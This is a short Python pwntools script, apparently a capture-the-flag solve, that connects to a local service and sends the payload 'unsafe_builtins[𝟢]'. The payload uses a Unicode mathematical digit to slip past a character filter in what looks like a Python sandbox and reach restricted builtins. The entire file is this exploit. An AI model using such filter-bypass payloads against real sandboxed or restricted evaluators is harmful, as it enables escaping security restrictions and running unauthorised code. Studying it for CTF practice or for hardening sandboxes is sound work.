import string
from pwn import *

context.log_level = "CRITICAL"

con = remote('localhost', 25767)

payload = f'unsafe_builtins[𝟢]'
con.sendline(payload.encode('utf-8'))
print(con.recvall().decode())
